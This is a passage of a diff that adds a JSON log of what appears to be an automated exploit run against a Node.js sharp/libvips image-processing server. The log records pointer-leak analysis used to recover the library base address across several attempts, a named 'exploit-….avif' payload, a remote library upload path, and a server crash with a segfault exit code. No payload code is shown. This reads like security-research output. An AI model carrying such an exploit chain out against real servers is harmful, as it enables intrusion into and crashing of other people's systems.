+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 4949,
+                "distinct_pointer_qwords": 1911,
+                "supported_bases": [],
+                "best_partial_bases": [
+                  {
+                    "base": "0x7f34f5865000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f34f5a231b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6f110"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f34f5a28120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6f688",
+                          "0x6f720"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f34d7e66000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f34d8029130",
+                        "repetitions": 11,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6df40",
+                          "0x6df48",
+                          "0x6df50",
+                          "0x6df58",
+                          "0x6df60",
+                          "0x6df68",
+                          "0x6df70",
+                          "0x6df78"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f34f585f000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f34f5a22120",
+                        "repetitions": 4,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6efb0",
+                          "0x6eff0",
+                          "0x6f048",
+                          "0x6f088"
+                        ]
+                      }
+                    ]
+                  }
+                ]
+              }
+            ],
+            "attempt": 4
+          },
+          {
+            "status": "selected",
+            "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "selected_base": "0x7f34f4c00000",
+            "selected_anchors": [
+              {
+                "offset": "0x1be1b0",
+                "value": "0x7f34f4dbe1b0",
+                "repetitions": 1,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0x4500"
+                ]
+              },
+              {
+                "offset": "0x1c3120",
+                "value": "0x7f34f4dc3120",
+                "repetitions": 3,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0x44f8",
+                  "0x62a8",
+                  "0x7338"
+                ]
+              },
+              {
+                "offset": "0x1c3130",
+                "value": "0x7f34f4dc3130",
+                "repetitions": 3,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0x4508",
+                  "0x62b8",
+                  "0x7348"
+                ]
+              }
+            ],
+            "rejected_candidates": [],
+            "supported_pair_count": 1,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "supported",
+                "reason": "exact_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 5857,
+                "distinct_pointer_qwords": 2055,
+                "supported_bases": [
+                  {
+                    "base": "0x7f34f4c00000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f34f4dbe1b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x4500"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f34f4dc3120",
+                        "repetitions": 3,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x44f8",
+                          "0x62a8",
+                          "0x7338"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f34f4dc3130",
+                        "repetitions": 3,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x4508",
+                          "0x62b8",
+                          "0x7348"
+                        ]
+                      }
+                    ]
+                  }
+                ],
+                "best_partial_bases": [
+                  {
+                    "base": "0x7f34f5865000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f34f5a231b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x7a790"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f34f5a28120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x7ad08",
+                          "0x7ada0"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f34f4c03000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f34f4dc6120",
+                        "repetitions": 6,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x58c8",
+                          "0x7d88",
+                          "0x83e8",
+                          "0x89d8",
+                          "0xd7d8",
+                          "0x16178"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f34f585f000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f34f5a22120",
+                        "repetitions": 4,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x7a630",
+                          "0x7a670",
+                          "0x7a6c8",
+                          "0x7a708"
+                        ]
+                      }
+                    ]
+                  }
+                ]
+              }
+            ],
+            "attempt": 5
+          }
+        ]
+      },
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-c62c0268c55540c294aeef497f279418.avif",
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 10,
+      "exploit_exit": 0,
+      "server_exit": -11
+    }
+  ]
+}
